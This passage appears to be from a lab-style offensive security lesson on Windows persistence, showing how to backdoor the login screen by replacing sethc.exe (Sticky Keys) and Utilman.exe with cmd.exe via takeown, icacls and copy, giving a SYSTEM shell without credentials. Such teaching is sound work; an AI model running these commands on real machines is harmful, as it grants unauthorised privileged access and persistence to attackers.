If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

## Sticky Keys

When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

```shell
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu:

You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen:

## Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:

```shell
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button:

And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges:
